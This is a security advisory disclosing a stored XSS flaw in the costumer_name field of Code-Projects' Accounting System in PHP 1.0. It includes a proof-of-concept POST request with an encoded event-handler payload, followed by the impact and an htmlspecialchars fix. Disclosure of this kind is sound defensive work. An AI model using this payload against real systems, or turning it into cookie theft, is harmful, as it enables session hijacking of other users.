## Advisory Information

Credit

### Discovered by: Ahmad Marzook
Title

## Accounting System in PHP 1.0 - Stored Cross-Site Scripting (XSS) in costumer_name Parameter

## Product

Accounting System in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/accounting-system-in-php-with-source-code/

## Affected Version

1.0

## Vulnerability Class

Cross Site Scripting

## Vulnerability Type

Stored Cross-Site Scripting (Stored XSS)

CWE

CWE-79

CVSS Severity

Medium

## Vulnerability Description

The Accounting System in PHP 1.0 contains a Stored Cross-Site Scripting (XSS) vulnerability in the costumer_name parameter handled by the /my_account/add_costumer.php endpoint. The application does not properly sanitize or encode user-supplied input before storing it in the backend database and displaying it within the web interface.

An attacker can inject malicious JavaScript payloads into the costumer_name field when adding a new customer record. Because the input is stored in the database and later rendered in the application without proper output encoding, the injected script executes automatically when the stored data is viewed.

Successful exploitation allows attackers to execute arbitrary JavaScript in the context of the victim’s browser. This may lead to session hijacking, credential theft, or performing unauthorized actions on behalf of authenticated users.

## Vulnerable Endpoint
/my_account/add_costumer.php
Vulnerable Parameter
costumer_name
## Proof of Concept
 ```plain
POST /my_account/add_costumer.php HTTP/1.1
 Host: localhost
 Content-Length: 126
 Cache-Control: max-age=0
 sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
 sec-ch-ua-mobile: ?0
 sec-ch-ua-platform: "macOS"
 Accept-Language: en-US,en;q=0.9
 Origin: http://localhost
 Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: navigate
 Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
Referer: http://localhost/my_account/add_costumer.php
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive

 costumer_name=%3Cdetails%2Fopen%2Fontoggle%3Dprompt%28origin%29%3E&mob=&cos_add=&village=Select+village&insert_costumer=Submit

```

## Encoded payload:

%3Cdetails%2Fopen%2Fontoggle%3Dprompt%28origin%29%3E
Impact

Successful exploitation may allow attackers to:

Execute arbitrary JavaScript

Hijack authenticated user sessions

Steal session cookies

Perform actions on behalf of other users

Inject malicious scripts into the application interface

Because the payload is stored in the database, the attack will affect every user who views the stored record.

## Remediation

Developers should implement the following security measures:

Sanitize and validate all user input

Encode output using htmlspecialchars() before rendering user-controlled data

Implement a Content Security Policy (CSP)

Perform regular security testing to detect injection vulnerabilities

Example secure code:

echo htmlspecialchars($costumer_name, ENT_QUOTES, 'UTF-8');

## PoC

https://github.com/user-attachments/assets/f23e649f-1fe4-4ff7-afee-f16bf5c14d4c
